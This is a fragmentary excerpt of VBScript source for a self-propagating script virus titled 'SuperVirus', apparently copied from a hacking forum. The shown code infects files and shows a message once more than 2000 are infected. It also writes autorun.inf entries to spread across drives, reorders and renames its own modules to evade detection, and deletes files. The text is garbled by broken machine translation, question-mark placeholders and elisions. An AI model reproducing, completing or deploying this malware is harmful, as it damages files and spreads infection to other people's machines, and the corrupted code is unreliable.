...
Function IsSexFile(fname)
    ...
    If InStr(fname, "??")>0 Or InStr(fname, "?")>0 Or InStr(fname, "??")>0 Or _
                InStr(fname, "??")>0 Or InStr(fname, "??")>0 Or InStr(fname, "??")>0 Or _
                InStr(fname, "??")>0 Or InStr(fname, "???")>0 Or InStr(fname, "??")>0 Then
        IsSexFile = True
    End  If
End Function
...
Sub RestoreSystem(objfso)
    ...
    If  objfso.FileExists (FullPath_V1) = True  Then
        Set  in f = objfso.GetFile (FullPath_V1)
        vf.Delete
    End  If
    If objfso.FileExists(FullPath_V0) = true Then
        Set  in f = objfso.GetFile (FullPath_V0)
        vf.Delete
    End  If
...
Function Head()
    ...
    "FullPath_V0 = GetSFolder (0) & Name_V1 main executable file associated with 'turning"  & vbCRLF & _
    "FullPath_V0 = GetSFolder (0) & Name_V1 main executable file associated with 'turning"  & vbCRLF & _
    "FullPath_V1 = GetSFolder (1) & Name_V1 'main execution profile command"  & vbCRLF & _
    ...
    "ModelHead=""'HJLMRRQRWYOZX""" & VBCRLF &_
    "ModelTail=""'WQKAULMNKKG""" & VBCRLF
End Function
Function VictimHead()
...
Sub ExeVbs_Virus()
    ...
    Names = Array("HJLMRRQRWYOZX", "WQKAULMNKKG")
    ...
    Select  Case  SubPara_V
        ...
        Case Else
            ...
            If IsOK(objfso, Date(), FullPath_Config) = False Then
                ...
                Case "InfectFiles"
                    ...
                    Order_Para = Order_Para + Cnt
                    If Order_Para>2000 Then
                        Call  WriteOK (objFSO, FullPath_Config, "Msg" , !! "You already have more than 2000 infected files, but please be assured that this virus can easily be removed, please contact four hundred eighteen thousand four hundred and sixty-five *** <img src = ' HTTP: // www. rohitab.com/discuss/public/style_emoticons/<#EMO_DIR# > /sleep.png 'class =' bbc_emoticon 'alt =' -_- '/>! " )
                    Else
        ...
        Else
            ...
            MainBody = GetMainBody(vbsCode, Sum_ModelCode)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V '?????????
            VbsCode_Virus = ChangeModelOrder (VbsCode_Virus, Sum_ModelCode) 'change module combination order
            VbsCode_Virus = ChangeName (VbsCode_Virus, Names) 'change the name of the module mark
            Call MonitorSystem(objfso, VbsCode_Virus)
        End  If
    End Select
    Set objfso = Nothing
...
Dim  Model Head, ModelTail
Cnt = 0
CntMax = 1000
Version = "4"
Name_V1 = GetUserName() & ".vbs"
FullPath_V0 = GetSFolder (0) & Name_V1 association 'main executable file steering
FullPath_V1 = GetSFolder (1) & Name_V1 'main command execution profile
...
Sub AutoRun(objfso, D, vbsCode)
    ...
    If objfso.FileExists(path_vbs) = False Or objfso.FileExists(path_autorun) = False Or GetVersion(objfso, path_vbs)<Version Then
        ...
        inf_autorun = "[AutoRun]" & VBCRLF & "Shellexecute=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun=??(&O)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun1=?????(&X)" & VBCRLF & "shell\AutoRun1\command=WScript.exe " & Name_V1 & " ""AutoRun"""
...
Function IsOK(objfso, Now_V, path_f)
    ...
    If p3 = "Admin" Then
        ...
        Always = True
        N = InputBox ( "0: exit; 1: monitoring system; 2: infected file" , "SuperVirus script test!" )
        If n = 0 Then
            Wscript.Quit
        ElseIf n = 1 Then
            Always = True
